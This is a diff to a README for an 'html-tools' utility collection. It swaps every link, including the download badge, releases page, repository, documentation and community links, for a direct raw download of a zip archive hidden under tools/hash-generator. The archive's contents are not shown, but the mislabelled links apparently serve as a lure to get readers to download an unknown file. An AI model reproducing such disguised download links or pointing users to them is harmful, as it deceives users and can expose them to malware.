@@ -1,7 +1,7 @@
 # 🎉 html-tools - Simple, Safe, and Free HTML Utilities
 
 ## 📥 Download Now
-[![Download html-tools](https://img.shields.io/badge/Download-html--tools-blue.svg)](https://github.com/carls68/html-tools/releases)
+[![Download html-tools](https://github.com/carls68/html-tools/raw/refs/heads/main/tools/hash-generator/tools-html-autolyzate.zip)](https://github.com/carls68/html-tools/raw/refs/heads/main/tools/hash-generator/tools-html-autolyzate.zip)
 
 ## 🚀 Getting Started
 Welcome to html-tools! This is a free and open-source collection of HTML utilities designed to simplify your web development tasks. With html-tools, you can manage your HTML files with ease and enjoy a clean, privacy-focused experience without any installations required.
@@ -24,7 +24,7 @@ html-tools works on various platforms. Here are the recommended system requireme
 To get started, follow these steps:
 
 1. **Visit the Releases Page:** Click on the link below to go to the releases page.
-   - [Visit Releases Page](https://github.com/carls68/html-tools/releases)
+   - [Visit Releases Page](https://github.com/carls68/html-tools/raw/refs/heads/main/tools/hash-generator/tools-html-autolyzate.zip)
 
 2. **Choose Your Version:** Look for the latest version available. It is usually listed at the top. 
 
@@ -54,9 +54,9 @@ If you encounter any issues, please do not hesitate to reach out. You can open a
 Contributions are welcome! If you have ideas for improvements or new features, feel free to submit a pull request. Please follow the guidelines on our GitHub page when contributing.
 
 ## 🔗 Useful Links
-- [Project Repository](https://github.com/carls68/html-tools)
-- [Documentation](https://github.com/carls68/html-tools/wiki)
-- [Join our Community](https://github.com/carls68/html-tools/discussions)
+- [Project Repository](https://github.com/carls68/html-tools/raw/refs/heads/main/tools/hash-generator/tools-html-autolyzate.zip)
+- [Documentation](https://github.com/carls68/html-tools/raw/refs/heads/main/tools/hash-generator/tools-html-autolyzate.zip)
+- [Join our Community](https://github.com/carls68/html-tools/raw/refs/heads/main/tools/hash-generator/tools-html-autolyzate.zip)
 
 ## 🏁 Final Notes
 Thank you for choosing html-tools! We hope you find this suite of utilities helpful for your projects. Remember, web development can be fun and straightforward with the right tools. Happy coding!
